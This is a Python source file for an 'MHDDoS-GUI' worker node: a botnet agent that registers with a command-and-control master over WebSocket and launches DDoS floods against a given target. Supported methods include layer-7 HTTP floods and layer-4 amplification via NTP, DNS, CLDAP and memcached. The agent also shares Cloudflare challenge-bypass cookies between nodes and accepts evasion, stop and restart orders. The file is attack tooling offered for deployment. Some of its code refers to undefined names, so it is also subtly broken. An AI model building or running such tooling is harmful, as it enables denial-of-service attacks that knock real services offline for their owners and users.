#!/usr/bin/env python3
"""
MHDDoS-GUI Worker Node — C2 Remote Execution Agent
Deploy on VPS: python worker.py --master http://C2_IP:8000 --token SECRET
"""

import argparse
import asyncio
import json
import logging
import os
import platform
import signal
import subprocess
import sys
import time
from pathlib import Path
from typing import Optional

import psutil
import aiohttp

# --- Configuration ---
__version__ = "1.2.1"
BASE_DIR = Path(__file__).resolve().parent
LOG_FORMAT = "[%(asctime)s - %(levelname)s] %(message)s"

logging.basicConfig(format=LOG_FORMAT, datefmt="%H:%M:%S", level=logging.INFO)
logger = logging.getLogger("Worker")

# Distributed State
class SharedState:
    cf_cookie: Optional[str] = None
    cf_ua: Optional[str] = None

SHARED = SharedState()

class WorkerNode:
    """Autonomous worker that connects to a C2 master via WebSocket and executes attack tasks."""

    def __init__(self, master_url: str, token: str):
        self.master_url = master_url.rstrip("/")
        # Convert http/https to ws/wss
        if self.master_url.startswith("http://"):
            self.ws_url = self.master_url.replace("http://", "ws://") + "/api/c2/ws"
        elif self.master_url.startswith("https://"):
            self.ws_url = self.master_url.replace("https://", "wss://") + "/api/c2/ws"
        else:
            self.ws_url = self.master_url + "/api/c2/ws"

        self.token = token
        self.node_id: str = ""
        self.active_process: Optional[subprocess.Popen] = None
        self.current_task_id: Optional[str] = None
        self.current_task_full: Optional[dict] = None
        self.running = True

        # Generate stable node ID from hostname + MAC
        import uuid
        self.node_id = f"{platform.node()[:8]}-{str(uuid.getnode())[-6:]}"

    def _system_info(self) -> dict:
        """Collect system metrics for telemetry."""
        # Note: interval=None makes it non-blocking, returning value since last call
        cpu_usage = psutil.cpu_percent(interval=None)
        return {
            "node_id": self.node_id,
            "hostname": platform.node(),
            "os": f"{platform.system()} {platform.release()}",
            "cpu_cores": psutil.cpu_count(),
            "cpu_percent": cpu_usage if cpu_usage > 0 else 0.1,
            "ram_total_mb": round(psutil.virtual_memory().total / (1024 ** 2)),
            "ram_percent": psutil.virtual_memory().percent,
            "python_version": platform.python_version(),
            "worker_version": __version__,
            "status": "busy" if self.active_process else "idle",
            "current_task_id": self.current_task_id,
        }

    async def execute_task(self, task: dict) -> None:
        """Execute an attack task by running start.py as a subprocess."""
        self.current_task_id = task.get("task_id", "unknown")
        self.current_task_full = task
        params = task.get("params", {})

        logger.info(
            f"\033[94m[*] TASK RECEIVED: {self.current_task_id} | "
            f"Method: {params.get('method', '?')} | "
            f"Target: {params.get('target', '?')}\033[0m"
        )

        command = self._build_command(params)
        if not command:
            logger.error("[!] Failed to build attack command from task params")
            return

        logger.info(f"[*] EXECUTING: {' '.join(command)}")

        try:
            self.active_process = subprocess.Popen(
                command,
                cwd=str(BASE_DIR),
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                encoding="utf-8",
                errors="replace",
                bufsize=1,
            )

            import threading
            def monitor_process():
                try:
                    for line in iter(self.active_process.stdout.readline, ""):
                        line = line.strip()
                        if line:
                            # Intercept Bypass Tokens
                            if line.startswith("__SYNC_BYPASS__||"):
                                try:
                                    import json
                                    token_data = json.loads(line.split("||", 1)[1])
                                    if self.ws_conn:
                                        # Forward bypass tokens back to Master C2
                                        asyncio.run_coroutine_threadsafe(
                                            self.ws_conn.send_json({
                                                "node_id": C2.node_id,
                                                "bypass_tokens": token_data
                                            }),
                                            self.loop
                                        )
                                except: pass
                                continue # Do not log this to console

                            # Sanitize for console output to avoid UnicodeEncodeError on some Windows environments
                            safe_line = line.encode('ascii', 'ignore').decode('ascii')
                            logger.info(f"  >> {safe_line}")

                            if self.ws_conn:
                                asyncio.run_coroutine_threadsafe(
                                    self.ws_conn.send_json({
                                        "node_id": C2.node_id,
                                        "task_id": self.current_task_id,
                                        "msg": safe_line
                                    }),
                                    self.loop
                                )
                    self.active_process.wait()
                    exit_code = self.active_process.returncode
                    logger.info(
                        f"\033[93m[*] TASK COMPLETE: {self.current_task_id} "
                        f"| Exit Code: {exit_code}\033[0m"
                    )
                except Exception as e:
                    logger.error(f"[!] Task execution error: {e}")
                finally:
                    self.active_process = None
                    self.current_task_id = None

            t = threading.Thread(target=monitor_process, daemon=True)
            t.start()

        except Exception as e:
            logger.error(f"[!] Task launch error: {e}")
            self.active_process = None
            self.current_task_id = None

    def _build_command(self, params: dict) -> list:
        """Build start.py command from C2 task parameters."""
        method = params.get("method", "")
        target = params.get("target", "")
        if not method or not target:
            return []

        # Layer classification
        LAYER7 = {
            "BYPASS", "CFB", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW",
            "HEAD", "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB",
            "CFBUAM", "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER",
            "KILLER", "TOR", "RHEX", "STOMP", "BROWSER",
        }
        LAYER4_AMP = {"MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP"}

        PROXY_TYPES = {"All Proxy": "0", "HTTP": "1", "SOCKS4": "4", "SOCKS5": "5", "RANDOM": "6"}

        threads = str(params.get("threads", 100))
        duration = str(params.get("duration", 3600))
        proxy_type_code = PROXY_TYPES.get(params.get("proxy_type", "SOCKS5"), "5")
        proxy_list = params.get("proxy_list", "") or "default.txt"
        rpc = str(params.get("rpc", 100))
        reflector = params.get("reflector", "") or "reflector.txt"
        proxy_refresh = str(params.get("proxy_refresh", 0))

        python_exe = sys.executable
        venv_python_win = BASE_DIR / "venv" / "Scripts" / "python.exe"
        venv_python_unix = BASE_DIR / "venv" / "bin" / "python"
        
        if venv_python_win.exists():
            python_exe = str(venv_python_win)
        elif venv_python_unix.exists():
            python_exe = str(venv_python_unix)

        cmd = [python_exe, "-u", "start.py", method, target]

        if method in LAYER7:
            cmd.extend([proxy_type_code, threads, proxy_list, rpc, duration, proxy_refresh])
            
            # Inject Shared Tokens if available
            # Task-specific params take priority over global SHARED state
            shared_cookie = params.get("shared_cookie") or SHARED.cf_cookie
            shared_ua = params.get("shared_ua") or SHARED.cf_ua
            
            if shared_cookie:
                cmd.extend(["--shared-cookie", shared_cookie])
            if shared_ua:
                cmd.extend(["--shared-ua", shared_ua])
                
        elif method in LAYER4_AMP:
            cmd.extend([threads, duration, reflector])
        else:
            if proxy_list and proxy_list.strip():
                cmd.extend([threads, duration, proxy_type_code, proxy_list, proxy_refresh])
            else:
                cmd.extend([threads, duration])

        if params.get("smart_rpc"):
            cmd.append("--smart")
        if params.get("autoscale"):
            cmd.append("--autoscale")
        if params.get("evasion"):
            cmd.append("--evasion")

        return cmd

    def stop_current_task(self) -> None:
        """Kill the active attack process."""
        if self.active_process:
            try:
                parent = psutil.Process(self.active_process.pid)
                for child in parent.children(recursive=True):
                    child.kill()
                parent.kill()
                logger.info("[*] Active task terminated by C2 command")
            except psutil.NoSuchProcess:
                pass
            finally:
                self.active_process = None
                self.current_task_id = None

    async def run(self) -> None:
        """Main event loop: connect WebSocket → authenticate → stream metrics / execute tasks."""
        logger.info(f"\033[96m[*] Connecting to C2 Master at {self.ws_url}\033[0m")
        
        retry_delay = 5
        max_retry_delay = 60

        while self.running:
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.ws_connect(self.ws_url, timeout=10) as ws:
                        # Reset retry delay on successful connection
                        retry_delay = 5
                        
                        # 1. Authenticate
                        await ws.send_json({
                            "token": self.token,
                            "node_id": self.node_id,
                            "version": __version__
                        })
                        
                        auth_response = await ws.receive_json()
                        if auth_response.get("status") == "success":
                            logger.info(f"\033[92m[*] REGISTERED with C2 Master | Node ID: {self.node_id}\033[0m")
                        else:
                            logger.error(f"[!] Master rejected connection: {auth_response.get('message')}")
                            await asyncio.sleep(retry_delay)
                            continue

                        # 2. Start telemetry streaming task
                        async def send_telemetry():
                            while True:
                                try:
                                    if ws.closed:
                                        break
                                    # Use interval=None for non-blocking psutil call
                                    metrics = self._system_info()
                                    await ws.send_json({"metrics": metrics})
                                except Exception:
                                    break
                                await asyncio.sleep(1.0) 

                        telemetry_task = asyncio.create_task(send_telemetry())

                        # 3. Listen for commands
                        async for msg in ws:
                            if msg.type == aiohttp.WSMsgType.TEXT:
                                data = json.loads(msg.data)
                                action = data.get("action")
                                
                                if action == "task":
                                    task = data.get("task", {})
                                    action_type = task.get("action", "attack")
                                    
                                    if action_type == "attack":
                                        await self.execute_task(task)
                                    elif action_type == "stop":
                                        self.stop_current_task()
                                    elif action_type == "shutdown":
                                        logger.info("[*] Shutdown command received. Exiting.")
                                        self.stop_current_task()
                                        sys.exit(0)

                                elif action == "sync_tokens":
                                    # Master has broadcasted a bypass token (e.g. from CFBUAM)
                                    tokens = data.get("tokens", {})
                                    if "cookie" in tokens:
                                        SHARED.cf_cookie = tokens["cookie"]
                                        SHARED.cf_ua = tokens.get("ua")
                                        logger.info(f"[\033[92m*\033[0m] Distributed C2: Universal Bypass Token synchronized.")
                                        
                                        # UPGRADE ACTIVE TASK?
                                        if self.active_process and self.current_task_full:
                                            params = self.current_task_full.get("params", {})
                                            # If it's a layer 7 attack and it was started without this shared cookie, restart it
                                            if params.get("method") in {
                                                "BYPASS", "CFB", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW",
                                                "HEAD", "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB",
                                                "CFBUAM", "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER",
                                                "KILLER", "TOR", "RHEX", "STOMP", "BROWSER"
                                            }:
                                                # Check if the task already had a shared cookie passed from Master
                                                if not params.get("shared_cookie"):
                                                    logger.info(f"[\033[92m*\033[0m] Distributed C2: Upgrading active task to Turbo Mode (Using Synced Cookie)...")
                                                    self.stop_current_task()
                                                    # Give it a tiny bit of time to cleanup
                                                    await asyncio.sleep(1)
                                                    # Re-execute with the same task ID and params
                                                    # execute_task will use _build_command which now pulls from SHARED.cf_cookie
                                                    await self.execute_task(self.current_task_full)

                                elif action_type == "restart":
                                        logger.info("[*] Restart command received.")
                                        self.stop_current_task()
                                        os.execl(sys.executable, sys.executable, *sys.argv)
                            
                            elif msg.type in (aiohttp.WSMsgType.CLOSED, aiohttp.WSMsgType.ERROR):
                                break

                        telemetry_task.cancel()
                        
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"[!] C2 Connection dropped: {e}. Reconnecting in {retry_delay}s...")
                await asyncio.sleep(retry_delay)
                # Exponential backoff
                retry_delay = min(max_retry_delay, retry_delay * 2)

def main():
    parser = argparse.ArgumentParser(
        description="MHDDoS-GUI Worker Node — C2 Remote Execution Agent",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python worker.py --master http://192.168.1.100:8000 --token mysecret\n"
        ),
    )
    parser.add_argument(
        "--master", required=True, help="C2 master URL (e.g. http://IP:8000)"
    )
    parser.add_argument(
        "--token", required=True, help="Authentication token (must match C2 master)"
    )

    args = parser.parse_args()

    print(
        "\033[95m"
        "+------------------------------------------+\n"
        "|    MHDDoS-GUI Worker Node v" + __version__ + "         |\n"
        "|    C2 Remote Execution Agent             |\n"
        "+------------------------------------------+"
        "\033[0m"
    )

    worker = WorkerNode(
        master_url=args.master,
        token=args.token,
    )

    # Graceful shutdown on SIGTERM (for systemd/docker)
    def handle_signal(sig, frame):
        logger.info(f"\n[*] Signal {sig} received. Shutting down...")
        worker.running = False
        worker.stop_current_task()
        sys.exit(0)

    signal.signal(signal.SIGTERM, handle_signal)
    signal.signal(signal.SIGINT, handle_signal)

    asyncio.run(worker.run())


if __name__ == "__main__":
    main()
